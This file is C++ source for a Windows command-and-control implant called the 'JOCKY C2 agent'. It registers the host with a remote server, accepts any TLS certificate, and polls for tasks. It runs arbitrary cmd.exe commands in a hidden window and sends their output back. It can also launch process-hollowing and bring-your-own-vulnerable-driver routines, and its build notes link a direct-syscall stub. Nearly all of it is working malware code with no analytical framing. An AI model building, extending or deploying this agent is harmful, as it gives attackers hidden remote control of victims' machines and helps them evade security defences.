// agent.cpp — JOCKY C2 agent
//
// Build from directSyscall/ (after assembling syscall_stub.obj):
//
//   cl /nologo /O2 /MT agent.cpp ^
//      ..\byovd\client\client.cpp ^
//      ..\processhollowing\hollow.cpp ^
//      syscall_stub.obj ^
//      /link /SUBSYSTEM:CONSOLE /OUT:jocky_agent.exe ^
//      ws2_32.lib winhttp.lib kernel32.lib advapi32.lib ntdll.lib
//
// Override at compile time:
//   /DC2_HOST=L"c2.jocky.online"   (default 127.0.0.1)
//   /DC2_PORT=443                   (default 443)
//   /DPOLL_INTERVAL_MS=30000        (default 30 000 ms)

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <stdio.h>
#include <string>
#include <vector>

// Forward declarations from the other translation units.
int  RunClientPipeline();   // byovd/client/client.cpp
DWORD RunHollowPipeline();  // processhollowing/hollow.cpp

// ── Config ────────────────────────────────────────────────────────────────────
#ifndef C2_HOST
#define C2_HOST L"127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 443
#endif
#ifndef POLL_INTERVAL_MS
#define POLL_INTERVAL_MS 30000
#endif

// ── Minimal JSON helpers ──────────────────────────────────────────────────────

// Extract the first string value for "key":"value".
static std::string JsonGetStr(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\":\"";
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos += needle.size();
    size_t end = json.find('"', pos);
    if (end == std::string::npos) return "";
    return json.substr(pos, end - pos);
}

// Extract the first raw JSON value (object or primitive) for "key": <value>.
// Works for both string and object values; returns everything up to the
// balancing } (for objects) or the next comma/] (for primitives).
static std::string JsonGetRaw(const std::string& json, const std::string& key,
                               size_t startPos = 0) {
    std::string needle = "\"" + key + "\":";
    size_t pos = json.find(needle, startPos);
    if (pos == std::string::npos) return "{}";
    pos += needle.size();
    // Skip whitespace
    while (pos < json.size() && json[pos] == ' ') pos++;
    if (pos >= json.size()) return "{}";

    if (json[pos] == '{') {
        // Scan for the matching closing brace.
        int depth = 0;
        size_t start = pos;
        for (size_t i = pos; i < json.size(); i++) {
            if (json[i] == '{') depth++;
            else if (json[i] == '}') { depth--; if (depth == 0) return json.substr(start, i - start + 1); }
        }
        return "{}";
    } else if (json[pos] == '"') {
        size_t start = pos;
        size_t end = json.find('"', pos + 1);
        if (end == std::string::npos) return "";
        return json.substr(start, end - start + 1);
    } else {
        // Number / boolean / null — read until , or ]
        size_t start = pos;
        size_t end = json.find_first_of(",]}", pos);
        if (end == std::string::npos) end = json.size();
        return json.substr(start, end - start);
    }
}

// JSON-escape a UTF-8 string for embedding in a JSON string literal.
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) out += ' ';
                else          out += c;
        }
    }
    return out;
}

// ── WinHTTP session (module-level, reused across requests) ────────────────────

static HINTERNET g_session = nullptr;
static HINTERNET g_connect = nullptr;

static bool HttpInit() {
    g_session = WinHttpOpen(
        L"JockyAgent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_session) return false;

    g_connect = WinHttpConnect(g_session, C2_HOST, C2_PORT, 0);
    return g_connect != nullptr;
}

struct HttpResp { DWORD status; std::string body; };

static HttpResp HttpDo(const wchar_t* method, const wchar_t* path,
                        const std::string& body, const std::string& token) {
    HttpResp resp{};

    HINTERNET hReq = WinHttpOpenRequest(
        g_connect, method, path,
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hReq) return resp;

    // Accept self-signed certs in dev.
    DWORD secFlags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA       |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    std::wstring hdrs = L"Content-Type: application/json\r\n";
    if (!token.empty()) {
        hdrs += L"Authorization: Bearer ";
        hdrs += std::wstring(token.begin(), token.end());
        hdrs += L"\r\n";
    }

    const void* pBody = body.empty() ? nullptr : body.c_str();
    DWORD  nBody = body.empty() ? 0 : (DWORD)body.size();

    if (!WinHttpSendRequest(hReq, hdrs.c_str(), (DWORD)hdrs.size(),
                            (LPVOID)pBody, nBody, nBody, 0)) {
        WinHttpCloseHandle(hReq); return resp;
    }
    if (!WinHttpReceiveResponse(hReq, nullptr)) {
        WinHttpCloseHandle(hReq); return resp;
    }

    DWORD statusCode = 0, sz = sizeof(statusCode);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &sz,
        WINHTTP_NO_HEADER_INDEX);
    resp.status = statusCode;

    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        std::string chunk(avail, '\0');
        DWORD nRead = 0;
        WinHttpReadData(hReq, &chunk[0], avail, &nRead);
        resp.body.append(chunk.data(), nRead);
    }

    WinHttpCloseHandle(hReq);
    return resp;
}

// ── Shell execution ───────────────────────────────────────────────────────────

static std::string RunShell(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
    HANDLE hR, hW;
    if (!CreatePipe(&hR, &hW, &sa, 0)) return "(pipe failed)";
    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /C " + cmd;
    std::vector<char> buf(full.begin(), full.end());
    buf.push_back('\0');

    CloseHandle(hW);
    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hR);
        return "(CreateProcess failed: " + std::to_string(GetLastError()) + ")";
    }

    std::string out;
    char tmp[4096];
    DWORD nr;
    while (ReadFile(hR, tmp, sizeof(tmp) - 1, &nr, nullptr) && nr > 0)
        out.append(tmp, nr);

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hR);

    if (out.size() > 8192) { out.resize(8192); out += "\n[truncated]"; }
    return out;
}

// ── Agent state ───────────────────────────────────────────────────────────────

static std::string g_agentId;
static std::string g_token;

// ── Registration ──────────────────────────────────────────────────────────────

static bool AgentRegister() {
    // Hostname
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hnLen = sizeof(hostname);
    GetComputerNameA(hostname, &hnLen);

    // Best-effort outbound IP via UDP trick (no data sent).
    std::string ipAddr = "0.0.0.0";
    {
        WSADATA wsa{};
        if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
            SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s != INVALID_SOCKET) {
                sockaddr_in target{};
                target.sin_family      = AF_INET;
                target.sin_port        = htons(80);
                target.sin_addr.s_addr = inet_addr("8.8.8.8");
                if (connect(s, (sockaddr*)&target, sizeof(target)) == 0) {
                    sockaddr_in local{};
                    int len = sizeof(local);
                    if (getsockname(s, (sockaddr*)&local, &len) == 0)
                        ipAddr = inet_ntoa(local.sin_addr);
                }
                closesocket(s);
            }
            WSACleanup();
        }
    }

    std::string body =
        "{\"hostname\":\"" + JsonEscape(hostname) + "\","
        "\"ip_address\":\"" + JsonEscape(ipAddr) + "\","
        "\"metadata\":{\"os\":\"Windows\",\"arch\":\"x64\"}}";

    auto resp = HttpDo(L"POST", L"/api/v1/agent/register", body, "");
    if (resp.status != 201) {
        printf("[-] Register HTTP %lu: %s\n", resp.status, resp.body.c_str());
        return false;
    }

    g_agentId = JsonGetStr(resp.body, "agent_id");
    g_token   = JsonGetStr(resp.body, "auth_token");

    if (g_agentId.empty() || g_token.empty()) {
        printf("[-] Register: missing agent_id/auth_token in response\n%s\n",
               resp.body.c_str());
        return false;
    }

    printf("[+] Registered  agent_id=%s  host=%s  ip=%s\n",
           g_agentId.c_str(), hostname, ipAddr.c_str());
    return true;
}

// ── Task dispatch ─────────────────────────────────────────────────────────────

static void DispatchTask(const std::string& taskId,
                          const std::string& commandType,
                          const std::string& payload) {
    printf("[*] Task %s  type=%s\n", taskId.c_str(), commandType.c_str());

    std::string resultJson;

    if (commandType == "shell") {
        std::string cmd = JsonGetStr(payload, "cmd");
        if (cmd.empty()) {
            resultJson = "{\"error\":\"no cmd field\"}";
        } else {
            printf("[*] Executing: %s\n", cmd.c_str());
            std::string out = RunShell(cmd);
            resultJson = "{\"output\":\"" + JsonEscape(out) + "\"}";
        }

    } else if (commandType == "hollow") {
        DWORD pid = RunHollowPipeline();
        if (pid <= 4) {
            resultJson = "{\"error\":\"hollow pipeline failed\"}";
        } else {
            resultJson = "{\"hollowed_pid\":" + std::to_string(pid) + "}";
        }

    } else if (commandType == "byovd") {
        int rc = RunClientPipeline();
        resultJson = "{\"exit_code\":" + std::to_string(rc) + "}";

    } else {
        resultJson = "{\"error\":\"unknown command_type\"}";
    }

    // Report result via telemetry.
    std::string body =
        "{\"task_id\":\"" + taskId + "\","
        "\"log_type\":\"event\","
        "\"data\":" + resultJson + "}";

    auto resp = HttpDo(L"POST", L"/api/v1/agent/telemetry", body, g_token);
    if (resp.status == 202)
        printf("[+] Telemetry accepted for task %s\n", taskId.c_str());
    else
        printf("[-] Telemetry HTTP %lu for task %s\n", resp.status, taskId.c_str());
}

// ── Poll ──────────────────────────────────────────────────────────────────────

static void AgentPoll() {
    auto resp = HttpDo(L"GET", L"/api/v1/agent/poll", "", g_token);

    if (resp.status == 429) return; // duplicate poll in flight
    if (resp.status != 200) {
        printf("[-] Poll HTTP %lu\n", resp.status);
        return;
    }

    // Walk through every task object in the response.
    // Tasks are in a JSON array; each has a "task_id" field.
    const std::string& body = resp.body;
    size_t search = 0;
    int count = 0;

    while (true) {
        // Find next task_id occurrence.
        size_t idPos = body.find("\"task_id\":\"", search);
        if (idPos == std::string::npos) break;

        size_t idStart = idPos + 11;
        size_t idEnd   = body.find('"', idStart);
        if (idEnd == std::string::npos) break;
        std::string taskId = body.substr(idStart, idEnd - idStart);

        // command_type — must be within ~512 bytes of task_id
        std::string cmdType;
        size_t ctPos = body.find("\"command_type\":\"", idPos);
        if (ctPos != std::string::npos && ctPos < idPos + 512) {
            size_t ctStart = ctPos + 16;
            size_t ctEnd   = body.find('"', ctStart);
            cmdType = body.substr(ctStart, ctEnd - ctStart);
        }

        // payload object — use balancing-brace extractor
        std::string payload = JsonGetRaw(body, "payload", idPos);

        if (!taskId.empty() && !cmdType.empty()) {
            DispatchTask(taskId, cmdType, payload);
            count++;
        }

        search = idEnd + 1;
    }

    if (count > 0)
        printf("[+] %d task(s) dispatched\n", count);
}

// ── Entry point ───────────────────────────────────────────────────────────────

int main() {
    printf("[*] JOCKY agent  C2=%ls:%d  poll=%dms\n",
           C2_HOST, C2_PORT, POLL_INTERVAL_MS);

    if (!HttpInit()) {
        printf("[-] WinHTTP init failed: %lu\n", GetLastError());
        return 1;
    }

    // Registration with exponential-ish backoff (5 attempts).
    for (int attempt = 0; attempt < 5; attempt++) {
        if (attempt) { printf("[*] Retry %d in 10 s...\n", attempt); Sleep(10000); }
        if (AgentRegister()) goto registered;
    }
    printf("[-] Could not register after 5 attempts — exiting\n");
    return 1;

registered:
    printf("[*] Poll loop started\n");
    while (true) {
        AgentPoll();
        Sleep(POLL_INTERVAL_MS);
    }
}
